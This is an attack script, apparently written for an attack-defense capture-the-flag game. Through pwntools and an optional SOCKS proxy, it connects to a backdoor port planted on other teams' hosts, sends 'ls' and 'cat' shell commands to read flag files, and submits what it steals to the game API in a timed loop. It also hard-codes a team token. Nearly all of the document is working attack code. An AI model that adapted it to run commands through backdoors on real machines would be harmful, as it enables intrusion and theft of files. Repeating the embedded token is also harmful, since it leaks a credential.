#!/usr/bin/python

#from swpag_client import Team
from api import *
import sys
import os
import time
import socks # pip install PySocks
import socket

# import PWN TOOLS LOGS and set logging.
os.environ["PWNLIB_SILENT"] = "1"
from pwn import *

# Run locally on home machine (requires connection through proxy) = 1
# Run from remote machine = 0
RUN_LOCAL = 1

# This is your team's token
TEAM_TOKEN = "04gwUvwtpPZzbzMMyaYGwMkTW3eBx34N"

# This may change between CTFs
GAME_IP = "http://18.219.145.160/"

# This is the list of infected hosts
INFECTED_HOSTS = ["team10"]
				#["team1", "team2", "team3", "team4", "team5", "team6", "team7", "team8", "team10", "team11",
                    #"team12", "team13", "team14", "team15", "team16", "team17", "team18", "team19", "team20", "team21"]

# Note the Host name and IP mapping might change during CTF
HOSTS_IP = {"team1":"172.31.129.1", "team2":"172.31.129.2", "team3":"172.31.129.3", "team4":"172.31.129.4",
		  "team5":"172.31.129.5", "team6":"172.31.129.6", "team7":"172.31.129.7", "team8":"172.31.129.8",
		  "team9":"172.31.129.9", "team10":"172.31.129.10", "team11":"172.31.129.11", "team12":"172.31.129.12",
		  "team13":"172.31.129.13", "team14":"172.31.129.14", "team15":"172.31.129.15", "team16":"172.31.129.16",
		  "team17":"172.31.129.17", "team18":"172.31.129.18", "team19":"172.31.129.19", "team20":"172.31.129.20",
		  "team21":"172.31.129.21"}

# This is the time per tick in seconds.
TICK_TIME = 180

# This is the service that the backdoor exploited. Note: The service that was the entry point is the only
#  flags visible to the backdoor, since it is running under that user.
EXPLOIT_SERVICE_ID = 10002

# Backdoor port. When backdoor is launched port is specified.
BACKDOOR_PORT = 29999

# Path to flags!
FLAG_PATH = "/opt/ctf/backup/append/"

# keys for target
HOST = "hostname"
PORT = "port"
FLAG_ID = "flag_id"
TEAM_NAME = "team_name"

def socketConn(host, port, sendStr):

	if (RUN_LOCAL):
		host = HOSTS_IP[host]

	recv = ""
	print "Host: " + host
	print "Port: " + str(port)
	print "Payload: " + sendStr

	try:
		conn = remote(host, port)
  		conn.send(sendStr)
  		recv = conn.recv(timeout = 0.2);
  		conn.close()

	except:
		print ("Exception sending message.")
		recv = None

	return recv


# Connects to current host and port to send exploit.
# Returns flag.
def getFlagFromBackdoor(target):
	flag = ""

	sendStr = "ls " + FLAG_PATH + " | grep " + target[FLAG_ID]

	recv = socketConn(target[HOST], BACKDOOR_PORT, sendStr)

	if (recv != None):
		recv = recv.strip()
		sendStr = "cat " + FLAG_PATH + "" + recv
		recv = socketConn(target[HOST], BACKDOOR_PORT, sendStr)
		if (recv != None):
			flag = recv.strip()
	print ("")
	return flag

def main():
	if TEAM_TOKEN == "":
		raise RuntimeError("You need to specify your team token.")

	# Initialize API wrapper
	api = ProjectCTFAPI(GAME_IP, TEAM_TOKEN)

	# Remove this line once you know what you're doing
	api.debug = False

	# Get all services in the game
	serviceIds = api.getServices()

	# Grab all targets
	targets = api.getTargets(EXPLOIT_SERVICE_ID)

	print("~" * 5 + " Backdoor search for service %s " % EXPLOIT_SERVICE_ID + "~" * 5)

	# List of targets of interest that match infected targets in INFECTED_HOSTS
	infectedTargets = []

	# Get only targets of interest.
	for target in targets:
		if (target[HOST] in INFECTED_HOSTS):
			infectedTargets.append(target)

	flags = []
	for target in infectedTargets:
		print "Attempting to connect to backdoor on: " + target[HOST]
		flag = getFlagFromBackdoor(target)
		if (flag != ""):
			flags.append(flag)
	print ("Flags: " + str(flags))
	api.debug = True
	api.submitFlag(flags)
	api.debug = False

if __name__ == "__main__":

	try:
		if (RUN_LOCAL):
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1',4444)
			socket.socket = socks.socksocket

		while True:
			main()
			print ("Sleeping till next tick to re-run.")
			time.sleep(TICK_TIME)

	except KeyboardInterrupt:
		print ("Keyboard Interrupt")
